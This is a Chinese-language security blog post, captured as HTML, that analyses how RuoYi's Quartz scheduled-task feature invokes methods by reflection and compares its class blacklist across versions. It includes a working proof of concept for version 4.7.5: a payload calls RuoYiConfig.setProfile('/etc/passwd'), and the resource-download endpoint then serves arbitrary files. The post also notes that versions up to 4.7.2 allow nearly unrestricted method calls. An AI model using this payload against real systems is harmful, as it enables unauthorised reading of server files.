@@ -1,0 +1,895 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="unam4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言​		以前都是直接贴poc，没分析过，最近碰见了也是定时任务，但不是若依的一套，回来看若依，发现若依的逻辑也抽象了，真是捡洞。 定时任务分析 创建任务 下载源码后，我们可以在ruoyi-quartz模块，拿到ruoyi定时任务的源码。   com.ruoyi.quartz.controller.SysJobController  这里就是对应的模块 com.ruoyi.quartz.contr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ruoyi定时任务浅析">
+<meta property="og:url" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/index.html">
+<meta property="og:site_name" content="unam4">
+<meta property="og:description" content="前言​		以前都是直接贴poc，没分析过，最近碰见了也是定时任务，但不是若依的一套，回来看若依，发现若依的逻辑也抽象了，真是捡洞。 定时任务分析 创建任务 下载源码后，我们可以在ruoyi-quartz模块，拿到ruoyi定时任务的源码。   com.ruoyi.quartz.controller.SysJobController  这里就是对应的模块 com.ruoyi.quartz.contr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026174956321.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026181824359.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026182010206.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026182048185.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026184215206.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026184306868.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026184609843.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026185915296.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026190013651.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026190730682.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026191025335-9941025.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026191238679.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026191248254.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026191551371.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026191655501.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026191809857.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026191948450.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026192139622.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026192230974.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026192627909.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026192957302.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026193042503.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026193338055.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026193143044.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026193136517.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026193736119.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026193847260-9942729.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026194501101.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026194802637.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026194959880.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026195221549.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026224026324.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026224039450.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026231352728.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026231726022.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026232044514.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241027000801430.png">
+<meta property="og:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241027002808213.png">
+<meta property="article:published_time" content="2024-10-26T09:42:32.000Z">
+<meta property="article:modified_time" content="2024-10-27T06:48:46.702Z">
+<meta property="article:author" content="unam4">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://unam4.github.io/2024/10/26/ruoyi%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%B5%85%E6%9E%90/image-20241026174956321.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ruoyi定时任务浅析 - unam4</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"unam4.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>unam4&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/01.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ruoyi定时任务浅析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-26 17:42" pubdate>
+          2024年10月26日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ruoyi定时任务浅析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​		以前都是直接贴poc，没分析过，最近碰见了也是定时任务，但不是若依的一套，回来看若依，发现若依的逻辑也抽象了，真是捡洞。</p>
+<h3 id="定时任务分析"><a href="#定时任务分析" class="headerlink" title="定时任务分析"></a>定时任务分析</h3><ul>
+<li><p>创建任务</p>
+<p>下载源码后，我们可以在ruoyi-quartz模块，拿到ruoyi定时任务的源码。</p>
+</li>
+</ul>
+<p>com.ruoyi.quartz.controller.SysJobController</p>
+<p><img src="image-20241026174956321.png" srcset="/img/loading.gif" lazyload alt="image-20241026174956321"></p>
+<p>这里就是对应的模块</p>
+<p>com.ruoyi.quartz.controller.SysJobController#addSave</p>
+<p><img src="image-20241026181824359.png" srcset="/img/loading.gif" lazyload alt="image-20241026181824359"></p>
+<p>这里创建定时任务，然后经过一系列判断调用jobService.insertJob进行插入数据库中。</p>
+<p>com.ruoyi.quartz.service.impl.SysJobServiceImpl#insertJob</p>
+<p><img src="image-20241026182010206.png" srcset="/img/loading.gif" lazyload alt="image-20241026182010206"></p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">ScheduleConstants.<span class="hljs-keyword">Status</span>.<span class="hljs-keyword">PAUSE</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="image-20241026182048185.png" srcset="/img/loading.gif" lazyload alt="image-20241026182048185"></p>
+<p>新建任务时，默认设置暂定状态。</p>
+<p>如果插入成果，调用ScheduleUtils.createScheduleJob创建计划任务</p>
+<p>com.ruoyi.quartz.util.ScheduleUtils#createScheduleJob</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createScheduleJob</span><span class="hljs-params">(Scheduler scheduler, SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Job</span>&gt; jobClass = getQuartzJobClass(job);<br>    <span class="hljs-comment">// 构建job信息</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">jobId</span> <span class="hljs-operator">=</span> job.getJobId();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">jobGroup</span> <span class="hljs-operator">=</span> job.getJobGroup();<br>    <span class="hljs-type">JobDetail</span> <span class="hljs-variable">jobDetail</span> <span class="hljs-operator">=</span> JobBuilder.newJob(jobClass).withIdentity(getJobKey(jobId, jobGroup)).build();<br><br>    <span class="hljs-comment">// 表达式调度构建器</span><br>    <span class="hljs-type">CronScheduleBuilder</span> <span class="hljs-variable">cronScheduleBuilder</span> <span class="hljs-operator">=</span> CronScheduleBuilder.cronSchedule(job.getCronExpression());<br>    cronScheduleBuilder = handleCronScheduleMisfirePolicy(job, cronScheduleBuilder);<br><br>    <span class="hljs-comment">// 按新的cronExpression表达式构建一个新的trigger</span><br>    <span class="hljs-type">CronTrigger</span> <span class="hljs-variable">trigger</span> <span class="hljs-operator">=</span> TriggerBuilder.newTrigger().withIdentity(getTriggerKey(jobId, jobGroup))<br>            .withSchedule(cronScheduleBuilder).build();<br><br>    <span class="hljs-comment">// 放入参数，运行时的方法可以获取</span><br>    jobDetail.getJobDataMap().put(ScheduleConstants.TASK_PROPERTIES, job);<br><br>    <span class="hljs-comment">// 判断是否存在</span><br>    <span class="hljs-keyword">if</span> (scheduler.checkExists(getJobKey(jobId, jobGroup)))<br>    &#123;<br>        <span class="hljs-comment">// 防止创建时存在数据问题 先移除，然后在执行创建操作</span><br>        scheduler.deleteJob(getJobKey(jobId, jobGroup));<br>    &#125;<br><br>    <span class="hljs-comment">// 判断任务是否过期</span><br>    <span class="hljs-keyword">if</span> (StringUtils.isNotNull(CronUtils.getNextExecution(job.getCronExpression())))<br>    &#123;<br>        <span class="hljs-comment">// 执行调度任务</span><br>        scheduler.scheduleJob(jobDetail, trigger);<br>    &#125;<br><br>    <span class="hljs-comment">// 暂停任务</span><br>    <span class="hljs-keyword">if</span> (job.getStatus().equals(ScheduleConstants.Status.PAUSE.getValue()))<br>    &#123;<br>        scheduler.pauseJob(ScheduleUtils.getJobKey(jobId, jobGroup));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里可以看到，常见任务，主要就是build了一个jobDetail，trigger。其中trigger和jobId，jobGroup，cronScheduleBuilder进行绑定，</p>
+<p>jobDetail就是放入了job的一些信息。最后把他们注册到scheduler中，让他去执行</p>
+<ul>
+<li>再来看执行</li>
+</ul>
+<p>com.ruoyi.quartz.controller.SysJobController#run</p>
+<p><img src="image-20241026184215206.png" srcset="/img/loading.gif" lazyload alt="image-20241026184215206"></p>
+<p>调用jobService.run。</p>
+<p><img src="image-20241026184306868.png" srcset="/img/loading.gif" lazyload alt="image-20241026184306868"></p>
+<p>有了上面的基础，这里就很能看懂了，new 一个JobDataMap，把任务参数put进去，在传入的jobid调用ScheduleUtils去找Schedule中找jobkey。然后调用triggerJob。</p>
+<p>org.quartz.core.QuartzScheduler#triggerJob(org.quartz.JobKey, org.quartz.JobDataMap)</p>
+<p><img src="image-20241026184609843.png" srcset="/img/loading.gif" lazyload alt="image-20241026184609843"></p>
+<p>新建一个trigger和我们jobkey,JobDataMap绑定, 然后调用storeTrigger，加入到jobList，进行触发。</p>
+<ul>
+<li><p>Scheduler进行触发</p>
+<p>org.quartz.simpl.SimpleThreadPool.WorkerThread#run()</p>
+<p><img src="image-20241026185915296.png" srcset="/img/loading.gif" lazyload alt="image-20241026185915296"></p>
+<p>最后就会调用到invokeMethod</p>
+<p>com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(com.ruoyi.quartz.domain.SysJob)</p>
+<p><img src="image-20241026190013651.png" srcset="/img/loading.gif" lazyload alt="image-20241026190013651"></p>
+<p>获取SysJob中的参数，首先判断是不是bean，bean就调用getbean获取。不是然后反射调用。太搞了，参数都是前端传进来的。</p>
+</li>
+<li><p>总结</p>
+<p>创建任务是，会将任务参数插入到数据库中，成功后，就新建jobDetail，trigger，然后注册到scheduler。立即执行时，会重新创建一个trigger，在和job绑定到scheduler中触发。</p>
+</li>
+</ul>
+<p>com.ruoyi.quartz.controller.SysJobController#changeStatus</p>
+<p><img src="image-20241026190730682.png" srcset="/img/loading.gif" lazyload alt="image-20241026190730682"></p>
+<p>找到Job,设置job的 status;，然后调用</p>
+<p><img src="image-20241026191025335-9941025.png" srcset="/img/loading.gif" lazyload alt="image-20241026191025335"></p>
+<p>根据传入的status，进行分别调用。</p>
+<p><img src="image-20241026191238679.png" srcset="/img/loading.gif" lazyload alt="image-20241026191238679"></p>
+<p><img src="image-20241026191248254.png" srcset="/img/loading.gif" lazyload alt="image-20241026191248254"></p>
+<p>最后也是调用到scheduler执行执行或者暂停，</p>
+<h3 id="poc-构造"><a href="#poc-构造" class="headerlink" title="poc 构造"></a>poc 构造</h3><p><img src="image-20241026191551371.png" srcset="/img/loading.gif" lazyload alt="image-20241026191551371"></p>
+<p>就是在进行赋值的时候会有黑名单</p>
+<p>com&#x2F;ruoyi&#x2F;common&#x2F;constant&#x2F;Constants.java</p>
+<p><img src="image-20241026191655501.png" srcset="/img/loading.gif" lazyload alt="image-20241026191655501"></p>
+<p>这里手动修改了，注视了4.7.9的名单，这里看见了，4.7.9已经是白名单了，且只有一个类，没得玩了。</p>
+<p><img src="image-20241026191809857.png" srcset="/img/loading.gif" lazyload alt="image-20241026191809857"></p>
+<ul>
+<li>4.7.8的黑明单</li>
+</ul>
+<p><img src="image-20241026191948450.png" srcset="/img/loading.gif" lazyload alt="image-20241026191948450"></p>
+<p>还是有很多操作空间</p>
+<ul>
+<li>4.7.5</li>
+</ul>
+<p><img src="image-20241026192139622.png" srcset="/img/loading.gif" lazyload alt="image-20241026192139622"></p>
+<p>没有com.ruoyi.common.config</p>
+<ul>
+<li>4.7.2</li>
+</ul>
+<p><img src="image-20241026192230974.png" srcset="/img/loading.gif" lazyload alt="image-20241026192230974"></p>
+<p>这里没白名单，且黑名单也少，也就是《&#x3D;4.7.2以前，基本就和无限制调用<strong>任意类任意方法</strong>没什么区别</p>
+<h4 id="首先来看-4-7-5"><a href="#首先来看-4-7-5" class="headerlink" title="首先来看 4.7.5"></a>首先来看 4.7.5</h4><p>主要就是这个类</p>
+<p>com.ruoyi.common.config</p>
+<p><img src="image-20241026192627909.png" srcset="/img/loading.gif" lazyload alt="image-20241026192627909"></p>
+<p>一共三个</p>
+<p>主要有用的就是com.ruoyi.common.config.RuoYiConfig</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>      <span class="hljs-comment">/** 上传路径 */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String profile;<br>...<br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProfile</span><span class="hljs-params">(String profile)</span><br>    &#123;<br>        RuoYiConfig.profile = profile;<br>    &#125;<br>...<br></code></pre></td></tr></table></figure>
+
+<p>又一个方法可以配置上传路径。</p>
+<p>com.ruoyi.web.controller.common.CommonController#resourceDownload</p>
+<p><img src="image-20241026192957302.png" srcset="/img/loading.gif" lazyload alt="image-20241026192957302"></p>
+<p>配个&#x2F;download&#x2F;resource可任意文件下来</p>
+<p><img src="image-20241026193042503.png" srcset="/img/loading.gif" lazyload alt="image-20241026193042503"></p>
+<p><img src="image-20241026193338055.png" srcset="/img/loading.gif" lazyload alt="image-20241026193338055"></p>
+<p>这里检查也没什么用，我们用不上，主要就差..&#x2F;和文件后缀</p>
+<p>主要是这个</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">+</span> <span class="hljs-variable">StringUtils</span><span class="hljs-operator">.</span><span class="hljs-variable">substringAfter</span><span class="hljs-punctuation">(</span><span class="hljs-variable">resource</span><span class="hljs-operator">,</span> <span class="hljs-built_in">Constants</span><span class="hljs-operator">.</span><span class="hljs-type">RESOURCE_PREFIX</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="image-20241026193143044.png" srcset="/img/loading.gif" lazyload alt="image-20241026193143044"></p>
+<p><img src="image-20241026193136517.png" srcset="/img/loading.gif" lazyload alt="image-20241026193136517"></p>
+<p>他会在我们传入的resource找&#x2F;profile，没有返回控，有就截取&#x2F;profile后面的进行拼接，</p>
+<p>因为这里是把我们传入resource和RuoYiConfig.profile 拼接，只要resource没有**&#x2F;profile**,会返回控，这样路径就只要RuoYiConfig.profile，也就是我们只要把RuoYiConfig.profile设置成要下载的文件名就行了</p>
+<p><img src="image-20241026193736119.png" srcset="/img/loading.gif" lazyload alt="image-20241026193736119"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.ruoyi</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.config</span><span class="hljs-selector-class">.RuoYiConfig</span><span class="hljs-selector-class">.setProfile</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>执行后在访问 <a target="_blank" rel="noopener" href="http://127.0.0.1:8088/common/download/resource?resource=1.txt">http://127.0.0.1:8088/common/download/resource?resource=1.txt</a> 就可以下载，这里resource随便写,后缀在白名单里找一个就行，反正最后返回空。</p>
+<p><img src="image-20241026193847260-9942729.png" srcset="/img/loading.gif" lazyload alt="image-20241026193847260"></p>
+<p>这样就完成了任意文件下载。</p>
+<h4 id="4-7-2-相当于没有限制"><a href="#4-7-2-相当于没有限制" class="headerlink" title="4.7.2 相当于没有限制"></a>4.7.2 相当于没有限制</h4><p><a target="_blank" rel="noopener" href="https://github.com/SpringKill-team/SecurityInspector">https://github.com/SpringKill-team/SecurityInspector</a></p>
+<p>直接来我们的项目<a target="_blank" rel="noopener" href="https://github.com/SpringKill-team/SecurityInspector/blob/preview/src/main/kotlin/org/skgroup/securityinspector/rules/jndi/JNDIInjection.kt">SpringKill-team&#x2F;SecurityInspector</a> 找个</p>
+<p><img src="image-20241026194501101.png" srcset="/img/loading.gif" lazyload alt="image-20241026194501101"></p>
